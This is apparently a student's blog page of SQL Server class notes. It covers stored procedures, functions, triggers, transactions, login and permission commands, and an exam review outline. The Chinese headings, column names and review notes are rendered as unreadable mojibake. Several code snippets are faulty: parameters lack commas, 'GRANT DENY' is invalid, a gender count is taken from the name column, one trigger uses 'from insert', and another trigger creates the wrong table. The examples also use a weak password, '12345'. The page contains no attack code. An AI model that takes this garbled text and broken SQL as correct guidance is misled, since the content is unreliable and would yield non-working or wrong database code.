id="åˆ›å»ºä¸€ä¸ª-å¸¦è¾“å…¥çš„å­˜å‚¨è¿‡ç¨‹-ï¼Œé€šè¿‡è°ƒç”¨ä¸Šä¾‹çš„f-stud3ï¼ŒæŸ¥è¯¢æŸå­¦ç”Ÿçš„é€‰ä¿®è¯¾ç¨‹æƒ…å†µ"><a href="#åˆ›å»ºä¸€ä¸ª-å¸¦è¾“å…¥çš„å­˜å‚¨è¿‡ç¨‹-ï¼Œé€šè¿‡è°ƒç”¨ä¸Šä¾‹çš„f-stud3ï¼ŒæŸ¥è¯¢æŸå­¦ç”Ÿçš„é€‰ä¿®è¯¾ç¨‹æƒ…å†µ" class="headerlink" title="åˆ›å»ºä¸€ä¸ª==å¸¦è¾“å…¥çš„å­˜å‚¨è¿‡ç¨‹==ï¼Œé€šè¿‡è°ƒç”¨ä¸Šä¾‹çš„f_stud3ï¼ŒæŸ¥è¯¢æŸå­¦ç”Ÿçš„é€‰ä¿®è¯¾ç¨‹æƒ…å†µ"></a>åˆ›å»ºä¸€ä¸ª==å¸¦è¾“å…¥çš„å­˜å‚¨è¿‡ç¨‹==ï¼Œé€šè¿‡è°ƒç”¨ä¸Šä¾‹çš„f_stud3ï¼ŒæŸ¥è¯¢æŸå­¦ç”Ÿçš„é€‰ä¿®è¯¾ç¨‹æƒ…å†µ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Create Procedure use_f_stud3(@nam nchar(10))<br>AS<br>select * from dbo.f_stud3(@nam)<br>Go<br><br>Exec use_f_stud3(&#39;Mie&#39;)<br></code></pre></td></tr></table></figure><p>==datediff(year,å‡ºç”Ÿæ—¥æœŸ,getdate()) è·å–å¹´é¾„==</p><h2 id="å®šä¹‰å¤šè¯­å¥è¡¨å€¼å‡½æ•°ï¼Œæ ¹æ®è¾“å…¥çš„è¡¨åï¼Œè¿”å›è¯¥è¡¨æ‰€åŒ…å«çš„å­—æ®µåç§°ï¼Œç±»å‹ï¼Œç±»å‹é•¿åº¦ä»¥åŠæ˜¯å¦ä¸ºç©º"><a href="#å®šä¹‰å¤šè¯­å¥è¡¨å€¼å‡½æ•°ï¼Œæ ¹æ®è¾“å…¥çš„è¡¨åï¼Œè¿”å›è¯¥è¡¨æ‰€åŒ…å«çš„å­—æ®µåç§°ï¼Œç±»å‹ï¼Œç±»å‹é•¿åº¦ä»¥åŠæ˜¯å¦ä¸ºç©º" class="headerlink" title="==å®šä¹‰å¤šè¯­å¥è¡¨å€¼å‡½æ•°ï¼Œæ ¹æ®è¾“å…¥çš„è¡¨åï¼Œè¿”å›è¯¥è¡¨æ‰€åŒ…å«çš„å­—æ®µåç§°ï¼Œç±»å‹ï¼Œç±»å‹é•¿åº¦ä»¥åŠæ˜¯å¦ä¸ºç©º=="></a>==å®šä¹‰å¤šè¯­å¥è¡¨å€¼å‡½æ•°ï¼Œæ ¹æ®è¾“å…¥çš„è¡¨åï¼Œè¿”å›è¯¥è¡¨æ‰€åŒ…å«çš„å­—æ®µåç§°ï¼Œç±»å‹ï¼Œç±»å‹é•¿åº¦ä»¥åŠæ˜¯å¦ä¸ºç©º==</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mssql">create function f_tableinfo<br>(@tableName nvarchar(200))<br>returns @result table (ColName nvarchar(200),ColType nvarchar(200),ColLength int,ColIsNull bit)<br>as<br>begin<br>insert into @result(ColName,ColType,ColLength,ColIsNull)<br>select<br>c.[name] as ColumnName,<br>t.[name] as ColumnType,<br>c.max_length as MaxLength,<br>c.is_nullable as [IsNull]<br>from sys.columns c<br>inner join sys.types t on c.system_type_id&#x3D;t.system_type_id<br>Where c.[object_id]&#x3D;object_id(@tableName) and t.[name]&lt;&gt;&#39;sysname&#39;<br>Order by c.column_id<br>Return<br>End<br>Go<br>select * from f_tableinfo(&#39;Studinfo&#39;)<br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹æ–°å»ºdepartment-ç³»éƒ¨äººæ•°ï¼Œæ€»äººæ•°ï¼Œç”·ç”Ÿäººæ•°ï¼Œå¥³ç”Ÿäººæ•°-ï¼Œç”¨SQLè¯­å¥ä»å­¦ç”Ÿè¡¨ä¸­é‡‡é›†ç›¸åº”ä¿¡æ¯æ·»åŠ åˆ°ç³»éƒ¨è¡¨ä¸­ã€‚"><a href="#ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹æ–°å»ºdepartment-ç³»éƒ¨äººæ•°ï¼Œæ€»äººæ•°ï¼Œç”·ç”Ÿäººæ•°ï¼Œå¥³ç”Ÿäººæ•°-ï¼Œç”¨SQLè¯­å¥ä»å­¦ç”Ÿè¡¨ä¸­é‡‡é›†ç›¸åº”ä¿¡æ¯æ·»åŠ åˆ°ç³»éƒ¨è¡¨ä¸­ã€‚" class="headerlink" title="ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹æ–°å»ºdepartment(ç³»éƒ¨äººæ•°ï¼Œæ€»äººæ•°ï¼Œç”·ç”Ÿäººæ•°ï¼Œå¥³ç”Ÿäººæ•°)ï¼Œç”¨SQLè¯­å¥ä»å­¦ç”Ÿè¡¨ä¸­é‡‡é›†ç›¸åº”ä¿¡æ¯æ·»åŠ åˆ°ç³»éƒ¨è¡¨ä¸­ã€‚"></a>ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹æ–°å»ºdepartment(ç³»éƒ¨äººæ•°ï¼Œæ€»äººæ•°ï¼Œç”·ç”Ÿäººæ•°ï¼Œå¥³ç”Ÿäººæ•°)ï¼Œç”¨SQLè¯­å¥ä»å­¦ç”Ÿè¡¨ä¸­é‡‡é›†ç›¸åº”ä¿¡æ¯æ·»åŠ åˆ°ç³»éƒ¨è¡¨ä¸­ã€‚</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Create Procedure p_stuXibu<br>As<br>select ç³»éƒ¨åç§° as ç³»éƒ¨åç§°,count(*) as æ€»äººæ•°,<br>sum(case å§“å when &#39;å¥³&#39; then 1 else 0 End) as å¥³ç”Ÿäººæ•°<br>sum(case å§“å when &#39;ç”·&#39; then 1 else 0 End) as ç”·ç”Ÿäººæ•°<br>into ç³»éƒ¨è¡¨ From studinfo<br>Group by ç³»éƒ¨åç§°<br>Go<br>p_stuXiBu<br></code></pre></td></tr></table></figure><h2 id="åˆ›å»ºè§¦å‘å™¨tr-stud1ï¼Œå½“åœ¨è¯¾ç¨‹è¡¨ä¸­æ–°å¢ä¸€æ¡è®°å½•æ—¶ï¼Œåœ¨å±å¹•ä¸Šæ˜¾ç¤ºè¯¥æ–°å¢è®°å½•ä¿¡æ¯ï¼ŒåŒæ—¶æ¿€æ´»è¯¥æ¿€æ´»å™¨ï¼ŒéªŒè¯è¯¥è§¦å‘å™¨çš„æ‰§è¡Œç»“æœ"><a href="#åˆ›å»ºè§¦å‘å™¨tr-stud1ï¼Œå½“åœ¨è¯¾ç¨‹è¡¨ä¸­æ–°å¢ä¸€æ¡è®°å½•æ—¶ï¼Œåœ¨å±å¹•ä¸Šæ˜¾ç¤ºè¯¥æ–°å¢è®°å½•ä¿¡æ¯ï¼ŒåŒæ—¶æ¿€æ´»è¯¥æ¿€æ´»å™¨ï¼ŒéªŒè¯è¯¥è§¦å‘å™¨çš„æ‰§è¡Œç»“æœ" class="headerlink" title="åˆ›å»ºè§¦å‘å™¨tr_stud1ï¼Œå½“åœ¨è¯¾ç¨‹è¡¨ä¸­æ–°å¢ä¸€æ¡è®°å½•æ—¶ï¼Œåœ¨å±å¹•ä¸Šæ˜¾ç¤ºè¯¥æ–°å¢è®°å½•ä¿¡æ¯ï¼ŒåŒæ—¶æ¿€æ´»è¯¥æ¿€æ´»å™¨ï¼ŒéªŒè¯è¯¥è§¦å‘å™¨çš„æ‰§è¡Œç»“æœ"></a>åˆ›å»ºè§¦å‘å™¨tr_stud1ï¼Œå½“åœ¨è¯¾ç¨‹è¡¨ä¸­æ–°å¢ä¸€æ¡è®°å½•æ—¶ï¼Œåœ¨å±å¹•ä¸Šæ˜¾ç¤ºè¯¥æ–°å¢è®°å½•ä¿¡æ¯ï¼ŒåŒæ—¶æ¿€æ´»è¯¥æ¿€æ´»å™¨ï¼ŒéªŒè¯è¯¥è§¦å‘å™¨çš„æ‰§è¡Œç»“æœ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Create trigger tr_stud1 on course<br>For Insert<br>As<br>select * from inserted<br></code></pre></td></tr></table></figure><h2 id="å»ºç«‹ä¸€ä¸ªå‘½åäº‹åŠ¡trans-creditï¼Œå½“å­¦å·ä¸º-sidçš„å­¦ç”Ÿæ‰€é€‰çš„è¯¾ç¨‹ï¼ˆè¯¾ç¨‹ç¼–å·ä¸º-cidï¼‰çš„æ€»å­¦åˆ†æ²¡æœ‰è¶…è¿‡10æ—¶ï¼Œå°†å­¦å·å’Œè¯¾ç¨‹ç¼–å·å€¼ï¼ˆ-sid-cidï¼‰æ·»åŠ åˆ°gradeè¡¨ä¸­ï¼ŒåŒæ—¶ä¿®æ”¹stu-creditè¡¨ä¸­çš„æ€»å­¦åˆ†ï¼Œä½¿æ€»å­¦åˆ†ä¸ºå½“å‰æ€»å­¦åˆ†-æ‰€é€‰è¯¾ç¨‹çš„å­¦åˆ†å€¼ï¼ˆ-creï¼‰ï¼Œå¦åˆ™ï¼Œå–æ¶ˆè¯¥äº‹åŠ¡ï¼Œå®ç°å›æ»šã€‚"><a href="#å»ºç«‹ä¸€ä¸ªå‘½åäº‹åŠ¡trans-creditï¼Œå½“å­¦å·ä¸º-sidçš„å­¦ç”Ÿæ‰€é€‰çš„è¯¾ç¨‹ï¼ˆè¯¾ç¨‹ç¼–å·ä¸º-cidï¼‰çš„æ€»å­¦åˆ†æ²¡æœ‰è¶…è¿‡10æ—¶ï¼Œå°†å­¦å·å’Œè¯¾ç¨‹ç¼–å·å€¼ï¼ˆ-sid-cidï¼‰æ·»åŠ åˆ°gradeè¡¨ä¸­ï¼ŒåŒæ—¶ä¿®æ”¹stu-creditè¡¨ä¸­çš„æ€»å­¦åˆ†ï¼Œä½¿æ€»å­¦åˆ†ä¸ºå½“å‰æ€»å­¦åˆ†-æ‰€é€‰è¯¾ç¨‹çš„å­¦åˆ†å€¼ï¼ˆ-creï¼‰ï¼Œå¦åˆ™ï¼Œå–æ¶ˆè¯¥äº‹åŠ¡ï¼Œå®ç°å›æ»šã€‚" class="headerlink" title="å»ºç«‹ä¸€ä¸ªå‘½åäº‹åŠ¡trans_creditï¼Œå½“å­¦å·ä¸º@sidçš„å­¦ç”Ÿæ‰€é€‰çš„è¯¾ç¨‹ï¼ˆè¯¾ç¨‹ç¼–å·ä¸º@cidï¼‰çš„æ€»å­¦åˆ†æ²¡æœ‰è¶…è¿‡10æ—¶ï¼Œå°†å­¦å·å’Œè¯¾ç¨‹ç¼–å·å€¼ï¼ˆ@sid,@cidï¼‰æ·»åŠ åˆ°gradeè¡¨ä¸­ï¼ŒåŒæ—¶ä¿®æ”¹stu_creditè¡¨ä¸­çš„æ€»å­¦åˆ†ï¼Œä½¿æ€»å­¦åˆ†ä¸ºå½“å‰æ€»å­¦åˆ†+æ‰€é€‰è¯¾ç¨‹çš„å­¦åˆ†å€¼ï¼ˆ@creï¼‰ï¼Œå¦åˆ™ï¼Œå–æ¶ˆè¯¥äº‹åŠ¡ï¼Œå®ç°å›æ»šã€‚"></a>å»ºç«‹ä¸€ä¸ªå‘½åäº‹åŠ¡trans_creditï¼Œå½“å­¦å·ä¸º@sidçš„å­¦ç”Ÿæ‰€é€‰çš„è¯¾ç¨‹ï¼ˆè¯¾ç¨‹ç¼–å·ä¸º@cidï¼‰çš„æ€»å­¦åˆ†æ²¡æœ‰è¶…è¿‡10æ—¶ï¼Œå°†å­¦å·å’Œè¯¾ç¨‹ç¼–å·å€¼ï¼ˆ@sid,@cidï¼‰æ·»åŠ åˆ°gradeè¡¨ä¸­ï¼ŒåŒæ—¶ä¿®æ”¹stu_creditè¡¨ä¸­çš„æ€»å­¦åˆ†ï¼Œä½¿æ€»å­¦åˆ†ä¸ºå½“å‰æ€»å­¦åˆ†+æ‰€é€‰è¯¾ç¨‹çš„å­¦åˆ†å€¼ï¼ˆ@creï¼‰ï¼Œå¦åˆ™ï¼Œå–æ¶ˆè¯¥äº‹åŠ¡ï¼Œå®ç°å›æ»šã€‚</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs mssql">use Stuhyy<br>go<br><br>if exists(select * from sys.all_objects where name &#x3D; &#39;trans_credit&#39;)<br>drop trigger trans_credit<br>go<br><br>create trigger trans_credit on stu_credit<br>for insert<br>as<br>BEGIN TRAN é€‰è¯¾<br>--save tran é€‰è¯¾<br>declare @sid char(10),@cid char(10),@mark int,@totalmark int<br>set @sid &#x3D; (select å­¦å· from inserted)<br>set @cid &#x3D; (select è¯¾ç¨‹å· from inserted)<br>set @mark &#x3D; (select å­¦åˆ† from inserted)<br>set @totalmark &#x3D; (select æ€»å­¦åˆ† from stu_credit where å­¦å· &#x3D; @sid) + @mark<br>if @totalmark &gt;10<br>BEGIN<br>print &#39;è¶…å‡ºæ€»å­¦åˆ†!é€‰è¯¾å¤±è´¥ï¼&#39;<br>rollback tran é€‰è¯¾<br>END<br>else<br>BEGIN<br>update stu_credit set æ€»å­¦åˆ† &#x3D; @totalmark where å­¦å· &#x3D; @sid<br>if OBJECT_ID(N&#39;grade&#39;,N&#39;U&#39;) is not null<br>insert into grade <br>Values(@sid,@cid)<br>else <br>create table student  --åˆ›å»ºè¡¨student<br>(å­¦å· char(10) ,<br>è¯¾ç¨‹å· char(10),<br>)<br>insert into grade <br>Values(@sid,@cid)<br>END<br>commit TRAN é€‰è¯¾<br>GO<br>GO<br><br></code></pre></td></tr></table></figure><h2 id="ç”¨T-Sqlè¯­å¥åˆ›å»ºsql-server-ç™»å½•1-test-w1-ç™»å½•å¯†ç ä¸º12345-é»˜è®¤è®¿é—®pubs"><a href="#ç”¨T-Sqlè¯­å¥åˆ›å»ºsql-server-ç™»å½•1-test-w1-ç™»å½•å¯†ç ä¸º12345-é»˜è®¤è®¿é—®pubs" class="headerlink" title="ç”¨T-Sqlè¯­å¥åˆ›å»ºsql server ç™»å½•1_test_w1,ç™»å½•å¯†ç ä¸º12345,é»˜è®¤è®¿é—®pubs"></a>ç”¨T-Sqlè¯­å¥åˆ›å»ºsql server ç™»å½•1_test_w1,ç™»å½•å¯†ç ä¸º12345,é»˜è®¤è®¿é—®pubs</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mssql">sp_addlogin<br>@loginame &#x3D; &#39;Mie&#39;<br>@passwd &#x3D; &#39;12345&#39;<br>@dfdb &#x3D; &#39;pubs&#39;<br></code></pre></td></tr></table></figure><h2 id="æˆäºˆWindowsç”¨æˆ·è¿æ¥åˆ°sql-serverçš„æƒåˆ©"><a href="#æˆäºˆWindowsç”¨æˆ·è¿æ¥åˆ°sql-serverçš„æƒåˆ©" class="headerlink" title="æˆäºˆWindowsç”¨æˆ·è¿æ¥åˆ°sql serverçš„æƒåˆ©"></a>æˆäºˆWindowsç”¨æˆ·è¿æ¥åˆ°sql serverçš„æƒåˆ©</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mssql">EXEC sp_grantloging â€˜CSUSQL\1_test_w2â€™<br>Sp_addlogin<br>@loginame &#x3D; &#39;1_test_s2&#39;<br>@defdb &#x3D; &#39;Stuhyy&#39;<br></code></pre></td></tr></table></figure><h2 id="æ·»åŠ æ•°æ®åº“ç”¨æˆ·"><a href="#æ·»åŠ æ•°æ®åº“ç”¨æˆ·" class="headerlink" title="æ·»åŠ æ•°æ®åº“ç”¨æˆ·"></a>æ·»åŠ æ•°æ®åº“ç”¨æˆ·</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">EXEC sp_grantdbaccess &#39;u_test_w1&#39;<br></code></pre></td></tr></table></figure><h2 id="ç¦æ­¢ç”¨æˆ·u-test-s1-å¯¹courseè¡¨çš„æ’å…¥å’Œåˆ é™¤æƒé™ï¼Œæ’¤é”€å¯¹studinfoçš„æ›´æ–°æƒé™"><a href="#ç¦æ­¢ç”¨æˆ·u-test-s1-å¯¹courseè¡¨çš„æ’å…¥å’Œåˆ é™¤æƒé™ï¼Œæ’¤é”€å¯¹studinfoçš„æ›´æ–°æƒé™" class="headerlink" title="ç¦æ­¢ç”¨æˆ·u_test_s1 å¯¹courseè¡¨çš„æ’å…¥å’Œåˆ é™¤æƒé™ï¼Œæ’¤é”€å¯¹studinfoçš„æ›´æ–°æƒé™"></a>ç¦æ­¢ç”¨æˆ·u_test_s1 å¯¹courseè¡¨çš„æ’å…¥å’Œåˆ é™¤æƒé™ï¼Œæ’¤é”€å¯¹studinfoçš„æ›´æ–°æƒé™</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mssql">GRANT<br>DENY Insert,Delete On course<br>Revoke Update on Studinfo<br></code></pre></td></tr></table></figure><h2 id="å¯¹ç”¨æˆ·u-test-s1æ·»åŠ æˆå‘˜r-test-s1"><a href="#å¯¹ç”¨æˆ·u-test-s1æ·»åŠ æˆå‘˜r-test-s1" class="headerlink" title="å¯¹ç”¨æˆ·u_test_s1æ·»åŠ æˆå‘˜r_test_s1"></a>å¯¹ç”¨æˆ·u_test_s1æ·»åŠ æˆå‘˜r_test_s1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">EXEC Sp_addrolemember &#39;u_test_s1&#39; , &#39;r_test_s1&#39;<br></code></pre></td></tr></table></figure><h2 id="åˆ é™¤è´¦æˆ·"><a href="#åˆ é™¤è´¦æˆ·" class="headerlink" title="åˆ é™¤è´¦æˆ·"></a>åˆ é™¤è´¦æˆ·</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Sp_revokelogin &#39;u_test_w1&#39;<br>Sp_revokelogin &#39;u_test_s1&#39;<br></code></pre></td></tr></table></figure><h2 id="åˆ é™¤æ•°æ®åº“ä¸­ç”¨æˆ·"><a href="#åˆ é™¤æ•°æ®åº“ä¸­ç”¨æˆ·" class="headerlink" title="åˆ é™¤æ•°æ®åº“ä¸­ç”¨æˆ·"></a>åˆ é™¤æ•°æ®åº“ä¸­ç”¨æˆ·</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Sp_revokedbaccess &#39;r_test_s1&#39;<br></code></pre></td></tr></table></figure><h2 id="åˆ é™¤æ•°æ®åº“è§’è‰²r-test-s1"><a href="#åˆ é™¤æ•°æ®åº“è§’è‰²r-test-s1" class="headerlink" title="åˆ é™¤æ•°æ®åº“è§’è‰²r_test_s1"></a>åˆ é™¤æ•°æ®åº“è§’è‰²r_test_s1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">EXEC sp_droprolemember &#39;u_test_w1&#39;,&#39;r_test_s1&#39;<br></code></pre></td></tr></table></figure><h2 id="2019-12-4ä¸Šè¯¾ç¬”è®°"><a href="#2019-12-4ä¸Šè¯¾ç¬”è®°" class="headerlink" title="2019/12/4ä¸Šè¯¾ç¬”è®°"></a>2019/12/4ä¸Šè¯¾ç¬”è®°</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">use employee<br>Go <br>if <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> sys.all_objects <span class="hljs-keyword">where</span><br>name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;trigger_welcome&#x27;</span> <span class="hljs-keyword">and</span> type <span class="hljs-operator">=</span> &quot;TR&quot;)<br><span class="hljs-keyword">Drop</span> <span class="hljs-keyword">trigger</span> trigger_welcome<br>go<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Create</span> <span class="hljs-keyword">trigger</span> tr_employye <span class="hljs-keyword">on</span> employee<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">delete</span><br><span class="hljs-keyword">as</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@msg</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>)<br><span class="hljs-keyword">select</span> <span class="hljs-variable">@msg</span> <span class="hljs-operator">=</span> str(@<span class="hljs-variable">@rowcount</span>)<span class="hljs-operator">+</span>&quot;ä¸ªå‘˜å·¥è¢«åˆ é™¤&quot;<br><span class="hljs-keyword">select</span> <span class="hljs-variable">@msg</span><br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Create</span> <span class="hljs-keyword">Trigger</span> test_tr<br><span class="hljs-keyword">on</span> employee <span class="hljs-keyword">from</span> <span class="hljs-keyword">insert</span>,update,<span class="hljs-keyword">delete</span><br><span class="hljs-keyword">as</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> inserted<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> deleted<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">trigger</span> tri_del_sales2<br><span class="hljs-keyword">on</span> sotrebak<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">delete</span> <span class="hljs-keyword">as</span><br><span class="hljs-keyword">delete</span> sales_bak <span class="hljs-keyword">from</span> deleted<br><span class="hljs-keyword">where</span> deleted.sotr_id <span class="hljs-operator">=</span> sales_bak.stor_id<br></code></pre></td></tr></table></figure><h2 id="2019-12-11-ä¸Šè¯¾ç¬”è®°"><a href="#2019-12-11-ä¸Šè¯¾ç¬”è®°" class="headerlink" title="2019/12/11 ä¸Šè¯¾ç¬”è®°"></a>2019/12/11 ä¸Šè¯¾ç¬”è®°</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">BEGIN</span> TRAN[SACTION]<br><br><span class="hljs-keyword">COMMIT</span> TRAN[SACTION]<br><br><span class="hljs-keyword">ROLLBACK</span> TRAN[SACTION]<br></code></pre></td></tr></table></figure><h2 id="2019-12-25å¤ä¹ "><a href="#2019-12-25å¤ä¹ " class="headerlink" title="2019/12/25å¤ä¹ "></a>2019/12/25å¤ä¹ </h2><p>åˆ¤æ–­5åˆ†ï¼Œå•é€‰20åˆ†ï¼Œå¡«ç©º20åˆ†ï¼Œç®€ç­”é¢˜10åˆ†ï¼Œç»¼åˆè®¾è®¡45åˆ†</p><p>E-Rå›¾ä»€ä¹ˆæ ‡å¿—è¡¨ç¤ºå®ä½“ï¼Œå±æ€§ï¼Œå…³ç³»ï¼Ÿ     P9</p><p>æ•°æ®åº“ä¸‰çº§æ¨¡å¼ä½“ç³»ç»“æ„ï¼Œæœ‰åˆ©äº==æ•°æ®ç‹¬ç«‹æ€§==</p><blockquote><p>ä¸‰çº§æ¨¡å¼ç»“æ„åˆæ˜¯ä»€ä¹ˆï¼Œä¸ºä»€ä¹ˆå¯ä»¥æœ‰åˆ©   P6</p><p>æ¨¡å¼ï¼Œå†…æ¨¡å¼ï¼Œå¤–æ¨¡å¼</p><p>æ¨¡å¼:å¯¹æ•°æ®åº“å…¨éƒ¨æ•°æ®çš„æ•°æ®æ¨¡å¼å’Œç‰¹å¾çš„æ€»ä½“æè¿°</p><p>å†…æ¨¡å¼ï¼šå­˜å‚¨æ¨¡å¼ï¼Œæ•°æ®åº“æœ€ä½ä¸€çº§é€»è¾‘æè¿°</p><p>å¤–æ¨¡å¼:ç”¨æˆ·è§†å›¾ï¼ˆæ¥æºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨ç»„æˆçš„æŸ¥è¯¢è¡¨</p></blockquote><p>æ•°æ®åº“ç³»ç»Ÿä¸­ï¼Œç”¨æˆ·ä½¿ç”¨çš„æ•°æ®è§†å›¾ç”¨==å¤–æ¨¡å¼==æè¿°ï¼Œè¯¥æ¨¡å¼æ˜¯ç”¨æˆ·ä¸æ•°æ®åº“ç³»ç»Ÿä¹‹é—´çš„æ¥å£</p><p>ä¸€å¯¹ä¸€ï¼Œä¸€å¯¹å¤šï¼Œå¤šå¯¹å¤šä¸¾ä¾‹</p><p>æ•°æ®åº“ç‰¹ç‚¹ï¼šæ•°æ®å…±äº«ï¼Œæ•°æ®å®Œæ•´æ€§å’Œæ•°æ®ç‹¬ç«‹æ€§</p><p>èŒƒå¼åˆ†è§£:å‡å°‘å†—ä½™    èŒƒå¼P27</p><blockquote><p>æ˜¯ä»€ä¹ˆèŒƒå¼ï¼Œåˆ¤æ–­ä¸ç¬¦åˆæ›´é«˜èŒƒå¼å³å¯</p><p>1NFï¼šæ‰€æœ‰å±æ€§éƒ½ä¸èƒ½åˆ†è§£ä¸ºæ›´åŸºæœ¬çš„æ•°æ®å…ƒç´ </p><p>2NFï¼šä¸å­˜åœ¨éƒ¨åˆ†å‡½æ•°ä¾èµ–ï¼ˆæŸåˆ—ä¹Ÿèƒ½å‡½æ•°å†³å®šå¦ä¸€åˆ—å±æ€§ï¼‰</p><p>3NFï¼šéä¼ é€’å‡½æ•°ä¾èµ–</p></blockquote><p>æ•°æ®æ¨¡å‹ä¸‰è¦ç´ ï¼šæ•°æ®ç»“æ„ï¼ˆäºŒç»´è¡¨ï¼‰ï¼Œå…³ç³»æ“ä½œï¼ˆé€‰æ‹©æŠ•å½±é“¾æ¥ï¼‰ï¼Œå®Œæ•´æ€§çº¦æŸ</p><p>DBMSã€DBã€DBSï¼ˆsystemï¼ŒåŒ…å«äººï¼‰ã€DBA</p><table><thead><tr><th>Create</th><th>Insert</th></tr></thead><tbody><tr><td>Alter</td><td>update</td></tr><tr><td>Drop</td><td>Delete</td></tr></tbody></table><p>è‡ªç„¶è¿æ¥ï¼šæ¶ˆé™¤é‡å¤åˆ—</p><p>sql serveræ•°æ®åº“æ–‡ä»¶åç½®ï¼š.mdf .ldf .ndf</p><p>windowsèº«ä»½éªŒè¯ï¼Œæ··åˆèº«ä»½éªŒè¯</p><p>å­˜å‚¨è¿‡ç¨‹ï¼šä¸»åŠ¨è°ƒç”¨</p><p>è§¦å‘å™¨ï¼šæ ¹æ®æ¡ä»¶è§¦å‘</p><p>ç»¼åˆè®¾è®¡ï¼šE-Rå›¾è½¬æ¢ï¼Œ35åˆ†å†™ä»£ç 